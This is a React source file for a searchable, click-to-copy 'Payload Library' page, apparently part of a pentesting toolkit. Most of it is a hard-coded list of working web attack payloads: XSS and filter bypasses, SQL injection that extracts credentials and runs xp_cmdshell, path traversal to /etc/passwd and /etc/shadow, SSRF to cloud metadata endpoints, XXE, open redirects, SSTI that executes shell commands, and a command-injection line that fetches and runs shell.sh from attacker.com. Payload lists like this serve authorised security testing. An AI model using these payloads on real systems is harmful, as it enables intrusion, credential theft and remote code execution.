import React, { useState } from 'react';
import { Zap, Copy, Check, Search } from 'lucide-react';

const PAYLOAD_DB = [
  {
    cat: 'XSS — Basic',
    payloads: [
      '<script>alert(1)</script>',
      `<img src=x onerror=alert(1)>`,
      `<svg onload=alert(1)>`,
      `"><script>alert(document.domain)</script>`,
      `'><img src=x onerror=prompt(1)>`,
      `javascript:alert(1)`,
      `<body onload=alert(1)>`,
      `<iframe src="javascript:alert(1)">`,
      `<input autofocus onfocus=alert(1)>`,
      `<details open ontoggle=alert(1)>`,
    ],
  },
  {
    cat: 'XSS — Filter Bypass',
    payloads: [
      `<ScRiPt>alert(1)</sCrIpT>`,
      `<script>alert\`1\`</script>`,
      `<img src=1 href=1 onerror="javascript:alert(1)">`,
      `<svg><script>alert&#40;1&#41;</script>`,
      `%3Cscript%3Ealert(1)%3C/script%3E`,
      `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`,
      `<scr<script>ipt>alert(1)</scr</script>ipt>`,
      `"><img src=x:x onerror=eval(atob('YWxlcnQoMSk='))>`,
      `<a href="data:text/html,<script>alert(1)</script>">click</a>`,
    ],
  },
  {
    cat: 'XSS — DOM Based',
    payloads: [
      `#<script>alert(1)</script>`,
      `#"><img src=x onerror=alert(1)>`,
      `javascript:void(document.domain)`,
      `?q=<script>alert(document.cookie)</script>`,
    ],
  },
  {
    cat: 'SQL Injection — Detection',
    payloads: [
      `'`,
      `''`,
      `'--`,
      `' OR '1'='1`,
      `' OR 1=1--`,
      `" OR 1=1--`,
      `') OR ('1'='1`,
      `1; DROP TABLE users--`,
      `1 UNION SELECT NULL--`,
      `1 UNION SELECT NULL,NULL--`,
      `admin'--`,
      `' OR 'x'='x`,
    ],
  },
  {
    cat: 'SQL Injection — Data Extraction',
    payloads: [
      `' UNION SELECT username,password FROM users--`,
      `' UNION SELECT table_name,NULL FROM information_schema.tables--`,
      `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`,
      `1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'`,
      `'; EXEC xp_cmdshell('whoami')--`,
      `1; SELECT * FROM users INTO OUTFILE '/var/www/html/users.txt'`,
    ],
  },
  {
    cat: 'LFI / Path Traversal',
    payloads: [
      `../../../etc/passwd`,
      `../../../../etc/passwd`,
      `..%2F..%2F..%2Fetc%2Fpasswd`,
      `....//....//....//etc/passwd`,
      `/etc/passwd%00`,
      `php://filter/convert.base64-encode/resource=/etc/passwd`,
      `php://input`,
      `expect://id`,
      `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`,
      `file:///etc/passwd`,
      `../../../../etc/shadow`,
      `../../windows/system32/drivers/etc/hosts`,
    ],
  },
  {
    cat: 'SSRF',
    payloads: [
      `http://169.254.169.254/latest/meta-data/`,
      `http://169.254.169.254/latest/user-data/`,
      `http://metadata.google.internal/computeMetadata/v1/`,
      `http://192.168.0.1`,
      `http://localhost:22`,
      `http://[::1]:80`,
      `http://0177.0.0.1/`,
      `http://2130706433/`,
      `http://0x7f000001/`,
      `gopher://127.0.0.1:6379/_PING`,
      `dict://127.0.0.1:6379/info`,
    ],
  },
  {
    cat: 'XXE',
    payloads: [
      `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>`,
      `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><root>&xxe;</root>`,
      `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>`,
      `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
    ],
  },
  {
    cat: 'Command Injection',
    payloads: [
      `; ls`,
      `| ls`,
      `&& ls`,
      `|| ls`,
      '`ls`',
      `$(ls)`,
      `; cat /etc/passwd`,
      `| cat /etc/passwd`,
      `\n ls`,
      `%0a ls`,
      `; ping -c 1 attacker.com`,
      `| wget http://attacker.com/shell.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s`,
    ],
  },
  {
    cat: 'Open Redirect',
    payloads: [
      `//attacker.com`,
      `https://attacker.com`,
      `/\\attacker.com`,
      `//attacker.com/%2F..`,
      `https:attacker.com`,
      `%0d%0aLocation: https://attacker.com`,
      `////attacker.com`,
      `javascript:alert(document.domain)`,
    ],
  },
  {
    cat: 'SSTI (Server-Side Template Injection)',
    payloads: [
      `{{7*7}}`,
      `${7*7}`,
      `<%= 7*7 %>`,
      `#{7*7}`,
      `{{config}}`,
      `{{''.__class__.__mro__[1].__subclasses__()}}`,
      `{% for x in [].class.base.subclasses() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}`,
      `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
    ],
  },
];

function CopyBtn({ text }: { text: string }) {
  const [c, setC] = useState(false);
  return (
    <button onClick={() => { navigator.clipboard.writeText(text); setC(true); setTimeout(() => setC(false), 1500); }}
      className="p-1 text-muted-foreground hover:text-primary transition-colors shrink-0">
      {c ? <Check size={11} className="text-green-400" /> : <Copy size={11} />}
    </button>
  );
}

export default function Payloads() {
  const [search, setSearch] = useState('');
  const [active, setActive] = useState<string | null>(null);

  const filtered = PAYLOAD_DB.map(cat => ({
    ...cat,
    payloads: cat.payloads.filter(p => !search || p.toLowerCase().includes(search.toLowerCase())),
  })).filter(cat => !search || cat.payloads.length > 0 || cat.cat.toLowerCase().includes(search.toLowerCase()));

  const display = active ? filtered.filter(c => c.cat === active) : filtered;

  return (
    <div className="flex-1 overflow-y-auto p-4 md:p-8 font-mono">
      <div className="max-w-5xl mx-auto space-y-5">
        <header className="space-y-1">
          <h1 className="text-2xl font-bold flex items-center gap-2 text-primary"><Zap size={22} /> Payload Library</h1>
          <p className="text-muted-foreground text-xs">XSS, SQLi, LFI, SSRF, XXE, SSTI — all in one place. Click to copy.</p>
        </header>

        <div className="flex flex-wrap gap-2 items-center">
          <div className="flex items-center gap-2 bg-card border border-border rounded px-3 py-2 flex-1 min-w-48">
            <Search size={13} className="text-muted-foreground" />
            <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search payloads…"
              className="bg-transparent text-sm outline-none w-full font-mono" />
          </div>
          <div className="flex flex-wrap gap-1">
            <button onClick={() => setActive(null)}
              className={`text-[10px] px-2 py-1 rounded border tracking-wider transition-colors ${!active ? 'border-primary/50 text-primary bg-primary/10' : 'border-border text-muted-foreground hover:text-foreground'}`}>
              ALL
            </button>
            {PAYLOAD_DB.map(c => (
              <button key={c.cat} onClick={() => setActive(active === c.cat ? null : c.cat)}
                className={`text-[10px] px-2 py-1 rounded border tracking-wider transition-colors whitespace-nowrap ${active === c.cat ? 'border-primary/50 text-primary bg-primary/10' : 'border-border text-muted-foreground hover:text-foreground'}`}>
                {c.cat.split('—')[0].trim()}
              </button>
            ))}
          </div>
        </div>

        <div className="space-y-4">
          {display.map(cat => (
            <div key={cat.cat} className="bg-card/50 border border-border rounded-lg overflow-hidden">
              <div className="px-4 py-2 border-b border-border bg-black/20 text-xs font-bold text-primary tracking-widest uppercase flex items-center justify-between">
                <span>{cat.cat}</span>
                <span className="text-muted-foreground font-normal">{cat.payloads.length} payloads</span>
              </div>
              <div className="divide-y divide-border/50">
                {cat.payloads.map((p, i) => (
                  <div key={i} className="flex items-start gap-2 px-4 py-2.5 hover:bg-secondary/20 transition-colors group">
                    <code className="flex-1 text-[11px] text-primary/90 break-all whitespace-pre-wrap">{p}</code>
                    <CopyBtn text={p} />
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
